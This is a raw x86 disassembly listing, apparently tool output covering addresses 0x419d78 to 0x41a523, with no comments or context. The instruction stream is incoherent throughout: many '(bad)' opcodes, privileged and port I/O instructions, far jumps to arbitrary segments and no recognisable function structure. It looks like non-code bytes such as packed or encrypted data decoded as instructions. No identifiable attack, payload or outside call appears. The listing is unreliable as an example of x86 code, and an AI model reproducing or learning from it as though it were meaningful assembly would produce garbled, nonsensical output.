  419d78:	xlat   BYTE PTR ds:[ebx]
  419d79:	ret    0xb423
  419d7c:	pop    ecx
  419d7d:	ja     0x419d26
  419d7f:	test   BYTE PTR [ebp+0x6c],ah
  419d82:	ins    DWORD PTR es:[edi],dx
  419d83:	cmp    BYTE PTR [esi],0x80
  419d86:	mov    edx,esi
  419d88:	rcr    DWORD PTR [edi],0xbb
  419d8b:	mov    al,ds:0x9747fa48
  419d90:	mov    ah,BYTE PTR [ecx-0x546c1297]
  419d96:	or     eax,0x8b00f857
  419d9b:	loopne 0x419e0c
  419d9d:	jle    0x419d97
  419d9f:	test   al,0xd3
  419da1:	call   0x4b0d:0x3af9bf2f
  419da8:	and    DWORD PTR [ebx+edx*4-0x5c62916a],ecx
  419daf:	adc    eax,0x220c9076
  419db4:	and    DWORD PTR [esi],0xd04e567d
  419dba:	dec    ebp
  419dbb:	cs aad 0xed
  419dbe:	push   edi
  419dbf:	xor    DWORD PTR [esi+esi*1-0x7f877b44],esp
  419dc6:	add    al,0x56
  419dc8:	jp     0x419deb
  419dca:	xor    al,0xd3
  419dcc:	cmp    esp,DWORD PTR [ebp-0x30]
  419dcf:	test   DWORD PTR [ecx-0x1a],esi
  419dd2:	lahf   
  419dd3:	inc    DWORD PTR [ebp-0x4231db8]
  419dd9:	lods   al,BYTE PTR ds:[esi]
  419dda:	inc    eax
  419ddb:	mov    WORD PTR [edi],fs
  419ddd:	int3   
  419dde:	inc    eax
  419ddf:	popf   
  419de0:	push   esp
  419de1:	retf   0x893e
  419de4:	fldcw  WORD PTR ds:0x50a2d17
  419dea:	sahf   
  419deb:	fldcw  WORD PTR [eax+0x75]
  419dee:	or     eax,0xfba62519
  419df3:	and    BYTE PTR [esi],ch
  419df5:	sbb    ebx,DWORD PTR [eax+eiz*1-0x7ff77778]
  419dfc:	jg     0x419e5a
  419dfe:	push   ss
  419dff:	jg     0x419e6f
  419e01:	cli    
  419e02:	dec    eax
  419e03:	(bad)  
  419e05:	mov    bh,0x26
  419e07:	aaa    
  419e08:	cdq    
  419e09:	outs   dx,BYTE PTR ds:[esi]
  419e0a:	dec    ebp
  419e0b:	ss or  al,0xd9
  419e0e:	mov    dl,0xd8
  419e10:	add    al,0xb1
  419e12:	mov    cl,0x9c
  419e14:	sti    
  419e15:	adc    eax,0x33a62ef1
  419e1a:	push   cs
  419e1b:	cli    
  419e1c:	int    0x1b
  419e1e:	push   esi
  419e1f:	add    eax,0x2ec5628c
  419e24:	leave  
  419e25:	pop    edi
  419e26:	adc    al,0x4d
  419e28:	mul    DWORD PTR [esi+ebx*4-0x30]
  419e2c:	test   ebx,eax
  419e2e:	mov    bl,0x3f
  419e30:	sbb    ecx,DWORD PTR [esi]
  419e32:	pop    ecx
  419e33:	or     eax,0x8f6026d1
  419e38:	push   ebp
  419e39:	mov    BYTE PTR [ebp-0x190ab54],dl
  419e3f:	lods   al,BYTE PTR ds:[esi]
  419e40:	scas   al,BYTE PTR es:[edi]
  419e41:	retf   
  419e42:	ja     0x419e61
  419e44:	sbb    bl,dl
  419e46:	jno    0x419e5c
  419e48:	jbe    0x419e4c
  419e4a:	ins    DWORD PTR es:[edi],dx
  419e4b:	test   al,0x59
  419e4d:	jecxz  0x419dfa
  419e4f:	and    ebx,DWORD PTR [edi-0x3936e2e1]
  419e55:	mov    esi,0x70c1518
  419e5a:	pop    ss
  419e5b:	mov    WORD PTR [esi+0x4caac525],?
  419e61:	jg     0x419e1e
  419e63:	mov    eax,0xde7bc009
  419e68:	bound  edx,QWORD PTR [ecx-0x15]
  419e6b:	dec    eax
  419e6c:	dec    edx
  419e6d:	adc    dl,BYTE PTR [eax+0x29]
  419e70:	rcl    DWORD PTR [eax+0xc],cl
  419e73:	hlt    
  419e74:	repnz (bad) 
  419e76:	jmp    0x3ca2:0x20b8d0b7
  419e7d:	sbb    dl,BYTE PTR [edx]
  419e7f:	in     al,dx
  419e80:	enter  0x463d,0x74
  419e84:	inc    edi
  419e85:	mov    bl,0xc2
  419e87:	mov    ah,dh
  419e89:	add    BYTE PTR [edi-0x5],ch
  419e8c:	add    ch,cl
  419e8e:	lds    edi,FWORD PTR [edx-0x35]
  419e91:	push   eax
  419e92:	jmp    0xbb64:0xdec3e5b0
  419e99:	shr    BYTE PTR [ebx+0x34],0x48
  419e9d:	int    0xe4
  419e9f:	mov    dl,BYTE PTR [eax+0x3caa6bec]
  419ea5:	div    BYTE PTR [ebp-0x7372f162]
  419eab:	or     eax,0x44a4c17b
  419eb0:	adc    edi,esi
  419eb2:	bswap  ebx
  419eb4:	ret    0xef2a
  419eb7:	add    dl,ah
  419eb9:	jns    0x419ea5
  419ebb:	icebp  
  419ebc:	and    ah,ah
  419ebe:	mov    ds:0x1078c28f,eax
  419ec3:	sbb    ebx,DWORD PTR ds:0x50061b79
  419ec9:	push   es
  419eca:	aas    
  419ecb:	jno    0x419f34
  419ecd:	or     bl,BYTE PTR [edx+0x23]
  419ed0:	xor    BYTE PTR [edi],al
  419ed2:	xchg   BYTE PTR [edi-0x9],ch
  419ed5:	jo     0x419eca
  419ed7:	add    eax,DWORD PTR [edx]
  419ed9:	mov    BYTE PTR [eax-0x19e5700],ah
  419edf:	rol    BYTE PTR [esi-0xf7ebba],cl
  419ee5:	ret    0xb78
  419ee8:	push   esi
  419ee9:	shl    ah,1
  419eeb:	imul   ebx,DWORD PTR [eax-0x79],0xffffffc9
  419eef:	neg    DWORD PTR ds:0x1a69095
  419ef5:	add    eax,0x3926ffc4
  419efa:	rcl    BYTE PTR [edi-0x60],0xc4
  419efe:	mov    eax,0x55fc698b
  419f03:	ins    DWORD PTR es:[edi],dx
  419f04:	imul   eax,ecx,0x389501bd
  419f0a:	mov    dl,BYTE PTR [eax-0x2f]
  419f0d:	dec    ecx
  419f0e:	pop    ecx
  419f0f:	jbe    0x419f14
  419f11:	cmp    eax,0x3e915269
  419f16:	sahf   
  419f17:	cs adc ax,0xd6f0
  419f1c:	pop    ds
  419f1d:	inc    esi
  419f1e:	cmp    DWORD PTR [esi-0x7dd38b7],0x26
  419f25:	in     al,dx
  419f26:	xor    BYTE PTR [eax+eax*4],dh
  419f29:	pop    esp
  419f2a:	pop    esi
  419f2b:	xchg   esp,eax
  419f2c:	add    al,0x29
  419f2e:	fisttp WORD PTR [ebx-0x22027d61]
  419f34:	jbe    0x419f20
  419f36:	scas   al,BYTE PTR es:[edi]
  419f37:	xchg   esp,eax
  419f38:	and    BYTE PTR [ebp+0x10],al
  419f3b:	or     al,BYTE PTR [ebp+ecx*4+0x158022f0]
  419f42:	out    dx,eax
  419f43:	jl     0x419eda
  419f45:	xchg   ecx,eax
  419f46:	rep ins DWORD PTR es:[edi],dx
  419f48:	dec    edi
  419f49:	(bad)
  419f4d:	mov    ch,0x4d
  419f4f:	mov    dh,dl
  419f51:	jae    0x419fbd
  419f53:	dec    ecx
  419f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f55:	add    eax,0xb34f407a
  419f5a:	mov    db0,edi
  419f5d:	sbb    al,0x1b
  419f5f:	dec    edx
  419f60:	xor    bl,BYTE PTR [ebx]
  419f62:	hlt    
  419f63:	fiadd  DWORD PTR [edx]
  419f65:	test   DWORD PTR [edi+0x2e],esi
  419f68:	test   BYTE PTR [edx+0x17],0x9
  419f6c:	imul   esi,DWORD PTR [ecx+0x1d618260],0xb2d724e3
  419f76:	test   al,0xc
  419f78:	out    dx,al
  419f79:	jecxz  0x419fa8
  419f7b:	sbb    DWORD PTR [ebx+edx*2+0x4ed2c6e3],esi
  419f82:	shl    DWORD PTR [ecx-0x69e34a19],1
  419f88:	add    DWORD PTR [ebp+0x26],esi
  419f8b:	push   edx
  419f8c:	stc    
  419f8d:	mov    edi,0xf9f025e6
  419f92:	(bad)  
  419f93:	xchg   esp,eax
  419f94:	fsub   QWORD PTR [edi+0x71]
  419f97:	sub    eax,0x9a9ae12c
  419f9c:	inc    edi
  419f9d:	jno    0x419f91
  419f9f:	int    0x75
  419fa1:	test   al,0x3d
  419fa3:	mov    edx,0x4c3d777a
  419fa8:	mov    esi,DWORD PTR [ebx]
  419faa:	jnp    0x419fa6
  419fac:	bnd jmp 0x419f7b
  419faf:	out    0x8a,eax
  419fb1:	xor    ebp,DWORD PTR [esi-0x74cd9a7e]
  419fb7:	cmc    
  419fb8:	jb     0x419fc5
  419fba:	nop
  419fbb:	adc    bh,BYTE PTR [ecx-0x13]
  419fbe:	sub    al,0x7d
  419fc0:	push   cs
  419fc1:	repz mov cl,0xea
  419fc4:	dec    esp
  419fc5:	xor    ebx,DWORD PTR [ebx-0x12fec77f]
  419fcb:	inc    ebp
  419fcc:	fwait
  419fcd:	sbb    ch,BYTE PTR [edi-0x4f]
  419fd0:	jnp    0x419fdf
  419fd2:	cmp    al,0xef
  419fd4:	adc    DWORD PTR [esi*2+0x202e0656],ecx
  419fdb:	jecxz  0x41a040
  419fdd:	outs   dx,BYTE PTR ds:[esi]
  419fde:	cdq    
  419fdf:	cmp    ecx,edi
  419fe1:	xchg   edx,eax
  419fe2:	mov    ecx,0x68dc1450
  419fe7:	lods   al,BYTE PTR ds:[esi]
  419fe8:	push   eax
  419fe9:	cli    
  419fea:	sub    eax,0x7a6490eb
  419fef:	and    ah,dh
  419ff1:	push   eax
  419ff2:	cmp    ecx,eax
  419ff4:	pop    edi
  419ff5:	aas    
  419ff6:	inc    ebx
  419ff7:	lods   al,BYTE PTR ss:[esi]
  419ff9:	loope  0x419fa3
  419ffb:	int3   
  419ffc:	jns    0x41a071
  419ffe:	clc    
  419fff:	in     eax,dx
  41a000:	mov    ecx,0x94a18685
  41a005:	retf   
  41a006:	sub    BYTE PTR [ebp-0x6b56ae84],ch
  41a00c:	add    al,0xe2
  41a00e:	sbb    ebp,DWORD PTR [esi-0x4d]
  41a011:	jecxz  0x41a047
  41a013:	fwait
  41a014:	and    al,0x53
  41a016:	mov    ds:0xcfbb1b2c,eax
  41a01b:	adc    DWORD PTR [ecx+edx*4],0x4a111f79
  41a022:	cmp    ch,BYTE PTR [edi+edi*1+0x3d]
  41a026:	fucom  st(3)
  41a028:	push   esp
  41a029:	jl     0x41a00e
  41a02b:	fs scas al,BYTE PTR es:[edi]
  41a02d:	sub    DWORD PTR [ecx+0x3d],eax
  41a030:	mov    ebp,0x34f204f2
  41a035:	jecxz  0x41a038
  41a037:	and    al,0x53
  41a039:	xor    ah,BYTE PTR [edi+0x46]
  41a03c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a03d:	mul    ebx
  41a03f:	loop   0x41a016
  41a041:	addr16 push cs
  41a043:	xor    eax,0xe06a7ae5
  41a048:	xor    ecx,DWORD PTR [ebx]
  41a04a:	or     cl,dh
  41a04c:	stos   BYTE PTR es:[edi],al
  41a04d:	push   edx
  41a04e:	nop
  41a04f:	add    eax,0xffbdc53f
  41a054:	cdq    
  41a055:	and    al,0xb1
  41a057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a058:	(bad)  
  41a059:	mov    edx,0xc1bead7c
  41a05e:	sub    eax,DWORD PTR [eax+0x209a9a24]
  41a064:	add    eax,0x68924b9d
  41a069:	addr16 dec bl
  41a06c:	pushf  
  41a06d:	dec    ecx
  41a06e:	repnz or DWORD PTR [eax+ecx*2-0x74],esp
  41a073:	iret   
  41a074:	in     al,dx
  41a075:	pop    esp
  41a076:	fdivr  st(5),st
  41a078:	lods   eax,DWORD PTR ds:[esi]
  41a079:	xchg   DWORD PTR [eax+0x56],ebp
  41a07c:	les    esp,FWORD PTR [ebp+0x189acd5b]
  41a082:	out    dx,eax
  41a083:	xchg   esp,eax
  41a084:	and    eax,0x5b03a553
  41a089:	pop    edx
  41a08a:	(bad)  
  41a08b:	popf   
  41a08c:	cs push esi
  41a08e:	scas   eax,DWORD PTR es:[edi]
  41a08f:	ret    
  41a090:	mov    ds:0x88399bd,eax
  41a095:	or     DWORD PTR [ecx],esp
  41a097:	pop    ds
  41a098:	xchg   edi,eax
  41a099:	or     ecx,eax
  41a09b:	stos   BYTE PTR es:[edi],al
  41a09c:	jl     0x41a034
  41a09e:	and    ch,dh
  41a0a0:	mov    bl,0xe1
  41a0a2:	outs   dx,BYTE PTR ds:[esi]
  41a0a3:	call   0x7c6e7e6
  41a0a8:	jo     0x41a05c
  41a0aa:	lock and ch,BYTE PTR [ebx+0x7d]
  41a0ae:	dec    edx
  41a0af:	xor    bl,BYTE PTR [edx+edx*1+0xc96191f]
  41a0b6:	cdq    
  41a0b7:	xchg   ebp,eax
  41a0b8:	xor    al,0x37
  41a0ba:	cmp    cl,BYTE PTR [ecx+0x39]
  41a0bd:	leave  
  41a0be:	aas    
  41a0bf:	sub    edx,0x33
  41a0c2:	imul   esp,ecx,0x4e26d5fb
  41a0c8:	paddq  mm7,QWORD PTR ds:[ebx+0x27116523]
  41a0d0:	fsubp  st(0),st
  41a0d2:	sub    al,0x1e
  41a0d4:	mov    DWORD PTR [ebx+0x791de9b],ebp
  41a0da:	mov    ecx,DWORD PTR [ebx-0x1e]
  41a0dd:	mov    ah,0x9a
  41a0df:	dec    ecx
  41a0e0:	mov    ecx,0x9f99b16b
  41a0e5:	jnp    0x41a129
  41a0e7:	jne    0x41a0be
  41a0e9:	add    al,0x7e
  41a0eb:	ss jle 0x41a095
  41a0ee:	shl    BYTE PTR [eax],cl
  41a0f0:	hlt    
  41a0f1:	rcpps  xmm0,XMMWORD PTR [edi+ebp*1]
  41a0f5:	or     al,0x76
  41a0f7:	mov    edi,0x30f6a238
  41a0fc:	push   edx
  41a0fd:	das    
  41a0fe:	int    0x9
  41a100:	(bad)  [ebp-0x43edfb71]
  41a106:	in     al,dx
  41a107:	aas    
  41a108:	mov    bh,0x6f
  41a10a:	bswap  ebx
  41a10c:	les    ecx,FWORD PTR [ebx+0x6489deb3]
  41a112:	stc    
  41a113:	call   0x923b:0xe1655348
  41a11a:	fdiv   QWORD PTR [esi-0x7d]
  41a11d:	or     eax,0xd7ef70c8
  41a122:	jl     0x41a0f9
  41a124:	mov    ch,BYTE PTR [ebp+ecx*4-0x35]
  41a128:	xor    al,0xae
  41a12a:	xor    al,0x93
  41a12c:	sub    ch,bh
  41a12e:	in     al,0xf1
  41a130:	js     0x41a0ca
  41a132:	inc    eax
  41a133:	xor    BYTE PTR [ebx-0x7d1b0c7],dl
  41a139:	adc    ebx,DWORD PTR [ecx]
  41a13b:	or     BYTE PTR [edi-0x204a80fc],dl
  41a141:	fnstcw WORD PTR [eax]
  41a143:	cld    
  41a144:	lods   eax,DWORD PTR ds:[esi]
  41a145:	adc    al,ah
  41a147:	mov    BYTE PTR fs:[esp+eax*2],ah
  41a14b:	(bad)  
  41a14c:	jmp    0xffce:0xe5eda16e
  41a153:	mov    ds:0xc9c3128,eax
  41a158:	pand   mm7,QWORD PTR [edx+0x65]
  41a15c:	or     ecx,esi
  41a15e:	inc    di
  41a160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a161:	aas    
  41a162:	iret   
  41a163:	inc    esp
  41a164:	rcl    DWORD PTR [edx+ebx*2+0x2f826b01],1
  41a16b:	imul   dl
  41a16d:	jns    0x41a144
  41a16f:	stos   DWORD PTR es:[edi],eax
  41a170:	test   al,0xa8
  41a172:	sti    
  41a173:	push   0xfffffff7
  41a175:	jmp    0x41a1bc
  41a177:	pop    eax
  41a178:	sbb    ch,0x5b
  41a17b:	cdq    
  41a17c:	test   BYTE PTR [esi-0x62d5558],cl
  41a182:	ret    
  41a183:	pop    esp
  41a184:	inc    esp
  41a185:	lods   eax,DWORD PTR ds:[esi]
  41a186:	aam    0xde
  41a188:	inc    ebx
  41a189:	pop    edx
  41a18a:	cmp    al,0x4c
  41a18c:	sub    eax,0x5d514ad0
  41a191:	add    BYTE PTR [ebp+ebp*2+0x179010ec],dl
  41a198:	xor    bh,BYTE PTR [eax+0x31b6df53]
  41a19e:	add    esp,DWORD PTR [ebp+0x1aa1f03d]
  41a1a4:	sahf   
  41a1a5:	xchg   ebp,eax
  41a1a6:	jne    0x41a1bb
  41a1a8:	xor    DWORD PTR [ebp-0x2b],edi
  41a1ab:	mov    ah,0xaa
  41a1ad:	scas   eax,DWORD PTR es:[edi]
  41a1ae:	mov    al,0x87
  41a1b0:	pusha  
  41a1b1:	push   es
  41a1b2:	arpl   si,sp
  41a1b4:	xor    ebp,edx
  41a1b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1b7:	xor    BYTE PTR ss:[esi-0x7d],dh
  41a1bb:	sub    BYTE PTR [ebx],cl
  41a1bd:	cdq    
  41a1be:	iret   
  41a1bf:	fst    QWORD PTR [edi-0x3b]
  41a1c2:	adc    eax,0x7e536c14
  41a1c7:	fucomip st,st(7)
  41a1c9:	pop    ds
  41a1ca:	icebp  
  41a1cb:	ss std 
  41a1cd:	pop    eax
  41a1ce:	xor    ebp,ebx
  41a1d0:	js     0x41a156
  41a1d2:	je     0x41a224
  41a1d4:	xor    esp,esi
  41a1d6:	pop    es
  41a1d7:	and    ebp,DWORD PTR cs:[edx-0x71]
  41a1db:	cmp    BYTE PTR [eax*8+0x7341452b],bl
  41a1e2:	xchg   DWORD PTR [esi],ecx
  41a1e4:	aad    0x8
  41a1e6:	jecxz  0x41a1f7
  41a1e8:	push   esp
  41a1e9:	xchg   edi,eax
  41a1ea:	ins    DWORD PTR es:[edi],dx
  41a1eb:	pop    edi
  41a1ec:	cwde   
  41a1ed:	mov    esi,0xb0af1652
  41a1f2:	repnz in al,dx
  41a1f4:	pop    es
  41a1f5:	imul   edx,DWORD PTR [edx+0x4b7ca694],0xffffffb4
  41a1fc:	push   ecx
  41a1fd:	rol    BYTE PTR [ecx],0x56
  41a200:	push   cs
  41a201:	sbb    ebx,ecx
  41a203:	shl    BYTE PTR [edi+0x73102c71],0x22
  41a20a:	and    bh,BYTE PTR [edi]
  41a20c:	mov    ds:0x18f30797,al
  41a211:	xlat   BYTE PTR ds:[ebx]
  41a212:	outs   dx,DWORD PTR ds:[esi]
  41a213:	call   0xc1c8:0xfd208d61
  41a21a:	dec    ebx
  41a21b:	sub    al,0xec
  41a21d:	arpl   WORD PTR [ecx+0x3f],dx
  41a220:	pop    esp
  41a221:	in     al,0xc
  41a223:	fisttp DWORD PTR [ecx-0x6c]
  41a226:	inc    eax
  41a227:	and    ecx,ebp
  41a229:	nop
  41a22a:	adc    dl,dh
  41a22c:	popa   
  41a22d:	(bad)  
  41a22e:	scas   eax,DWORD PTR es:[edi]
  41a22f:	vmread DWORD PTR [ebp-0x47992a5c],edi
  41a236:	mov    ah,0x35
  41a238:	dec    ebp
  41a239:	enter  0xcdce,0x55
  41a23d:	shr    DWORD PTR [edx+eax*4+0x72],cl
  41a241:	je     0x41a29b
  41a243:	repz sub DWORD PTR [esi-0x64],ebp
  41a247:	jge    0x41a281
  41a249:	sub    al,0x36
  41a24b:	mov    DWORD PTR [esi-0x4f599593],ecx
  41a251:	ret    
  41a252:	jp     0x41a2ca
  41a254:	lods   al,BYTE PTR ds:[esi]
  41a255:	add    al,0xe9
  41a257:	xor    cl,dh
  41a259:	and    al,0x15
  41a25b:	mov    fs,edi
  41a25d:	loopne 0x41a2c8
  41a25f:	push   ebp
  41a260:	jnp    0x41a20d
  41a262:	mov    BYTE PTR [edi],cl
  41a264:	or     BYTE PTR [eax-0x62],cl
  41a267:	popa   
  41a268:	xor    ebx,DWORD PTR [edx+0x6d82f299]
  41a26e:	sub    al,0x80
  41a270:	push   ebp
  41a271:	sbb    BYTE PTR [ecx-0x77],bl
  41a274:	jnp    0x41a232
  41a276:	sub    ebp,DWORD PTR [ecx-0x22]
  41a279:	inc    ecx
  41a27a:	dec    ebx
  41a27b:	(bad)  
  41a27c:	sti    
  41a27d:	add    BYTE PTR [ebx+0x27],0xc2
  41a281:	pop    esi
  41a282:	ret    
  41a283:	adc    bh,bl
  41a285:	mov    ch,BYTE PTR [edx-0x3750b493]
  41a28b:	jae    0x41a2fb
  41a28d:	dec    ecx
  41a28e:	test   al,0xf8
  41a290:	sub    dh,BYTE PTR [ecx-0x31195c5a]
  41a296:	or     bh,BYTE PTR ds:0x58db673f
  41a29c:	mov    ebx,0xc00748c7
  41a2a1:	je     0x41a2d9
  41a2a3:	and    ebp,DWORD PTR [edi+0x15156ee0]
  41a2a9:	mov    DWORD PTR [ebx+eax*4+0x1f6a71f9],esp
  41a2b0:	lahf   
  41a2b1:	jp     0x41a24f
  41a2b3:	sbb    ebx,DWORD PTR [edx-0x5dac9159]
  41a2b9:	ins    BYTE PTR es:[edi],dx
  41a2ba:	jmp    0xbfbc:0x6a04e1d1
  41a2c1:	div    BYTE PTR [eax+0x549ebc64]
  41a2c7:	and    eax,0xd7d8d70e
  41a2cc:	aas    
  41a2cd:	mov    ds:0xd1b3fee,eax
  41a2d2:	dec    edx
  41a2d3:	or     al,0xa1
  41a2d5:	test   BYTE PTR [ebx],0x2b
  41a2d8:	xchg   BYTE PTR [ebx+0x3d],ch
  41a2db:	and    eax,0xc3a15c9c
  41a2e0:	in     al,dx
  41a2e1:	jno    0x41a27e
  41a2e3:	xchg   ecx,eax
  41a2e4:	jne    0x41a365
  41a2e6:	mov    al,ds:0xcf3e0fc4
  41a2eb:	jae    0x41a2ed
  41a2ed:	(bad)  
  41a2ee:	pop    edi
  41a2ef:	(bad)  
  41a2f0:	(bad)  [edx]
  41a2f2:	leave  
  41a2f3:	out    dx,eax
  41a2f4:	ja     0x41a2d6
  41a2f6:	and    al,0x4b
  41a2f8:	mov    dh,0x97
  41a2fa:	std    
  41a2fb:	xchg   edi,eax
  41a2fc:	(bad)  
  41a2fd:	icebp  
  41a2fe:	push   0x28
  41a300:	ins    DWORD PTR es:[edi],dx
  41a301:	cmc    
  41a302:	jmp    0xb11b:0x673702a6
  41a309:	repnz and DWORD PTR [edx],esi
  41a30c:	or     eax,0x132d4858
  41a311:	cli    
  41a312:	sub    eax,0xc2b5d72e
  41a317:	and    al,0x76
  41a319:	xchg   edi,eax
  41a31a:	int3   
  41a31b:	aas    
  41a31c:	retf   0xc1b8
  41a31f:	mov    dh,0x6
  41a321:	imul   BYTE PTR [ecx+eax*4-0x1edc5e24]
  41a328:	bound  ebp,QWORD PTR [edx]
  41a32a:	and    DWORD PTR [esi+0x43492bf4],eax
  41a330:	pop    es
  41a331:	mov    edi,DWORD PTR [eax-0x43777a2e]
  41a337:	cld    
  41a338:	or     ebp,DWORD PTR [edi-0x66d78a1b]
  41a33e:	adc    BYTE PTR [ecx],cl
  41a340:	push   0xffffffe4
  41a342:	imul   eax,DWORD PTR [ebx],0x8a482b22
  41a348:	jmp    0xb926:0x87ab0cc7
  41a34f:	(bad)  
  41a350:	shl    dl,0x1e
  41a353:	push   0x7bc0a291
  41a358:	clc    
  41a359:	out    0x89,eax
  41a35b:	addr16 xchg cl,cl
  41a35e:	mov    eax,DWORD PTR [edi]
  41a360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a361:	adc    BYTE PTR [eax],al
  41a363:	xchg   BYTE PTR [edi-0x76],bl
  41a366:	adc    DWORD PTR [edi-0xd],esp
  41a369:	lahf   
  41a36a:	cdq    
  41a36b:	test   DWORD PTR [edi-0x753105d7],ebx
  41a371:	in     eax,dx
  41a372:	fcom   DWORD PTR [eax-0x75980555]
  41a378:	mov    eax,0xd3b5bf2b
  41a37d:	mov    DWORD PTR [esp+eax*1-0x3d0cd174],esp
  41a384:	xchg   BYTE PTR [ecx-0xc585981],ah
  41a38a:	data16 cmp al,0x3
  41a38d:	sub    eax,0x937caf17
  41a392:	jp     0x41a397
  41a394:	cmp    bl,ah
  41a396:	jmp    0x345dc61e
  41a39b:	js     0x41a3c8
  41a39d:	cli    
  41a39e:	and    dl,BYTE PTR ds:0x515f6db2
  41a3a4:	stos   DWORD PTR es:[edi],eax
  41a3a5:	xchg   edx,eax
  41a3a6:	dec    esi
  41a3a7:	jle    0x41a411
  41a3a9:	adc    ch,al
  41a3ab:	lock mov esp,0x434d72bd
  41a3b1:	xor    eax,DWORD PTR [esi+0x74294bf]
  41a3b7:	push   edx
  41a3b8:	(bad)  
  41a3b9:	ret    
  41a3ba:	sub    al,0x6b
  41a3bc:	lar    ebp,WORD PTR [eax]
  41a3bf:	leave  
  41a3c0:	dec    edx
  41a3c1:	pop    ds
  41a3c2:	clc    
  41a3c3:	fist   DWORD PTR [ebp+0x9377ce4]
  41a3c9:	stos   DWORD PTR es:[edi],eax
  41a3ca:	stc    
  41a3cb:	sub    dl,dh
  41a3cd:	mov    bh,0xef
  41a3cf:	in     al,dx
  41a3d0:	loop   0x41a3ae
  41a3d2:	adc    DWORD PTR [esp+ebx*2-0x205537c5],0xa
  41a3da:	push   0x37f28704
  41a3df:	mov    edx,0xd111b31e
  41a3e4:	dec    edi
  41a3e5:	pop    eax
  41a3e6:	sub    al,0xeb
  41a3e8:	cmp    ebx,DWORD PTR [ebp-0x7bb4d4eb]
  41a3ee:	mov    esp,0x4b43c037
  41a3f3:	inc    ebp
  41a3f4:	fidiv  DWORD PTR [eax+0x6646c260]
  41a3fa:	stc    
  41a3fb:	and    BYTE PTR [eax-0x5a],bh
  41a3fe:	sbb    al,0x5e
  41a400:	addr16 cwde 
  41a402:	xchg   esp,eax
  41a403:	imul   ecx,DWORD PTR [ebx+eax*4-0x28e89d72],0xfa78ce45
  41a40e:	adc    bl,dh
  41a410:	xor    ebp,DWORD PTR [edx+0x7d]
  41a413:	fnstsw WORD PTR [ecx-0x448931d8]
  41a419:	sbb    ebx,ebp
  41a41b:	lods   eax,DWORD PTR ds:[esi]
  41a41c:	lahf   
  41a41d:	mov    ecx,0xe6371be6
  41a422:	scas   al,BYTE PTR es:[edi]
  41a423:	mov    eax,ecx
  41a425:	jmp    0xc33104d9
  41a42a:	popf   
  41a42b:	mov    esp,0x2692cf5a
  41a430:	push   esp
  41a431:	dec    esp
  41a432:	ins    DWORD PTR es:[edi],dx
  41a433:	push   ss
  41a434:	jmp    0x2cf6b756
  41a439:	repz jae 0x41a42c
  41a43c:	adc    eax,0xd5bd0cec
  41a441:	repnz or edi,eax
  41a444:	mov    ebx,0xee13362e
  41a449:	mov    esp,0x6bf3dfd4
  41a44e:	(bad)  
  41a44f:	xchg   esi,eax
  41a450:	(bad)  
  41a451:	out    dx,eax
  41a452:	xchg   edi,eax
  41a453:	out    dx,eax
  41a454:	int    0xdc
  41a456:	inc    ebp
  41a457:	pop    ds
  41a458:	add    dl,BYTE PTR [ecx-0x3c]
  41a45b:	sahf   
  41a45c:	(bad)  
  41a45e:	or     edi,DWORD PTR [ebp+0x76]
  41a461:	scas   al,BYTE PTR es:[edi]
  41a462:	sub    BYTE PTR [edx],dl
  41a464:	push   DWORD PTR [esp+esi*2+0x5bc56b6e]
  41a46b:	(bad)  
  41a46c:	ja     0x41a405
  41a46e:	inc    edi
  41a46f:	rcl    BYTE PTR [ecx+0x42],1
  41a472:	fmul   DWORD PTR [ebx+0x1966cb4d]
  41a478:	sub    eax,0x61635eda
  41a47d:	rol    ebx,cl
  41a47f:	mov    ds:0xc95653fc,eax
  41a484:	mov    esp,0xaf4facda
  41a489:	sbb    esi,ecx
  41a48b:	imul   ebx,esp,0x5bdeedca
  41a491:	sbb    eax,0x73235d42
  41a496:	(bad)  
  41a497:	or     al,0x48
  41a499:	or     ch,BYTE PTR [esi-0x64b2c595]
  41a49f:	lahf   
  41a4a0:	aad    0xc4
  41a4a2:	pop    es
  41a4a3:	loopne 0x41a4ac
  41a4a5:	inc    ecx
  41a4a7:	push   0x35326b26
  41a4ac:	pop    ss
  41a4ad:	cmc    
  41a4ae:	test   eax,0xb5e3f501
  41a4b3:	jne    0x41a51f
  41a4b5:	pop    es
  41a4b6:	ror    BYTE PTR [ebx-0x75],cl
  41a4b9:	xchg   edi,eax
  41a4ba:	mov    esi,0xf310eb2f
  41a4bf:	es jns 0x41a4e0
  41a4c2:	add    bl,BYTE PTR [ebp+0x15f1ab03]
  41a4c8:	(bad)  
  41a4c9:	pusha  
  41a4ca:	push   ebx
  41a4cb:	push   ds
  41a4cc:	pop    ds
  41a4cd:	add    al,0x52
  41a4cf:	push   edi
  41a4d0:	xchg   esi,eax
  41a4d1:	push   esp
  41a4d2:	jne    0x41a46f
  41a4d4:	mov    edx,0x510def1a
  41a4d9:	(bad)  
  41a4da:	jbe    0x41a501
  41a4dc:	inc    edi
  41a4dd:	or     al,0xdf
  41a4df:	jp     0x41a461
  41a4e1:	(bad)  
  41a4e2:	imul   esi,DWORD PTR [edi],0xffffffb7
  41a4e5:	retf   
  41a4e6:	add    al,0x8b
  41a4e8:	mov    al,0x48
  41a4ea:	inc    ecx
  41a4eb:	adc    eax,0x58fc960f
  41a4f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4f1:	int3   
  41a4f2:	ss mov dl,0xa4
  41a4f5:	add    DWORD PTR [edi+0x3b6be717],eax
  41a4fb:	xchg   edi,eax
  41a4fc:	cli    
  41a4fd:	cwde   
  41a4fe:	ds cmp eax,0x89c1f9e8
  41a504:	cs test BYTE PTR ss:[edi+0x7b],ah
  41a509:	out    0xe4,al
  41a50b:	jbe    0x41a4cf
  41a50d:	nop
  41a50e:	push   ds
  41a50f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a511:	in     al,dx
  41a512:	test   al,0xca
  41a514:	adc    ebx,DWORD PTR [ebp-0x5e]
  41a517:	adc    eax,0x6c6a62f
  41a51c:	pusha  
  41a51d:	loope  0x41a58a
  41a51f:	lds    esp,FWORD PTR [edx+ebx*4]
  41a522:	sti    
  41a523:	inc    esi
